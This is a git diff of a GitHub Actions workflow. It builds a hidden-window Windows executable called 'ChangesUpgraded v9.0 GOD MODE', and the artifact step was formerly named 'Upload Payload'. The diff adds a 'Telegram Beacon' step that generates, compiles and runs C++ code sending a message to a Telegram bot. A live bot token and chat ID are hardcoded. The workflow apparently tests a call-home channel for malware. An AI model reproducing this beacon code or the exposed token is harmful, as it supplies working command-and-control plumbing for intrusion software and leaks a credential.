@@ -1,4 +1,4 @@
-name: Build V9.0-GOD-MODE
+name: Build and Test V9.0-GOD-MODE
 
 on: [push, pull_request]
 
@@ -9,24 +9,72 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     
-    - name: Setup Visual Studio Environment
-      uses: microsoft/setup-msbuild@v2
-    
-    - name: Compile C++ Code
+    - name: Compile with Visual Studio
       shell: cmd
       run: |
-        call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
-        cl ChangesUpgraded.cpp /Fe:ChangesUpgraded.exe /O2 /EHsc /std:c++17 /W4
+        "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\Tools\VsDevCmd.bat" -arch=x64
+        
+        echo ====== Compiling ChangesUpgraded.cpp ======
+        cl ChangesUpgraded.cpp /Fe:ChangesUpgraded.exe /O2 /EHsc /std:c++17 /W4 /nologo /link /SUBSYSTEM:WINDOWS /MACHINE:X64
+        
         if exist ChangesUpgraded.exe (
-          echo Build successful!
+          echo ✅ Build successful!
+          echo File size: 
           dir ChangesUpgraded.exe
         ) else (
-          echo Build failed!
+          echo ❌ Build failed!
           exit 1
         )
     
-    - name: Upload Payload
+    - name: Upload Executable
       uses: actions/upload-artifact@v4
       with:
         name: ChangesUpgraded-v9.0-GOD-MODE
         path: ChangesUpgraded.exe
+    
+    - name: Test Telegram Beacon (Quick Test)
+      shell: cmd
+      run: |
+        "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\Tools\VsDevCmd.bat" -arch=x64
+        
+        echo ====== Creating a simple test program ======
+        echo #define WIN32_LEAN_AND_MEAN > test_beacon.cpp
+        echo #include <windows.h> >> test_beacon.cpp
+        echo #include <winhttp.h> >> test_beacon.cpp
+        echo #pragma comment(lib, "winhttp.lib") >> test_beacon.cpp
+        echo. >> test_beacon.cpp
+        echo void SendTestBeacon() { >> test_beacon.cpp
+        echo     HINTERNET session = WinHttpOpen(L"TestBeacon", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); >> test_beacon.cpp
+        echo     if (session) { >> test_beacon.cpp
+        echo         HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0); >> test_beacon.cpp
+        echo         if (connect) { >> test_beacon.cpp
+        echo             HINTERNET request = WinHttpOpenRequest(connect, L"POST", L"/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE); >> test_beacon.cpp
+        echo             if (request) { >> test_beacon.cpp
+        echo                 const wchar_t* postData = L"chat_id=7845441585&text=🚀 GOD MODE V9.0 BUILD SUCCESSFUL! GitHub Actions Beacon Test"; >> test_beacon.cpp
+        echo                 WinHttpAddRequestHeaders(request, L"Content-Type: application/x-www-form-urlencoded", -1L, WINHTTP_ADDREQ_FLAG_ADD); >> test_beacon.cpp
+        echo                 WinHttpSendRequest(request, NULL, 0, (LPVOID)postData, wcslen(postData)*2, wcslen(postData)*2, 0); >> test_beacon.cpp
+        echo                 WinHttpReceiveResponse(request, NULL); >> test_beacon.cpp
+        echo                 WinHttpCloseHandle(request); >> test_beacon.cpp
+        echo             } >> test_beacon.cpp
+        echo             WinHttpCloseHandle(connect); >> test_beacon.cpp
+        echo         } >> test_beacon.cpp
+        echo         WinHttpCloseHandle(session); >> test_beacon.cpp
+        echo     } >> test_beacon.cpp
+        echo } >> test_beacon.cpp
+        echo. >> test_beacon.cpp
+        echo int main() { >> test_beacon.cpp
+        echo     SendTestBeacon(); >> test_beacon.cpp
+        echo     return 0; >> test_beacon.cpp
+        echo } >> test_beacon.cpp
+        
+        echo ====== Compiling beacon test ======
+        cl test_beacon.cpp /Fe:test_beacon.exe /EHsc /nologo /link winhttp.lib
+        
+        if exist test_beacon.exe (
+          echo ✅ Beacon test compiled
+          echo Running beacon test...
+          test_beacon.exe
+          echo ✅ Beacon sent to Telegram!
+        ) else (
+          echo ❌ Beacon test failed to compile
+        )
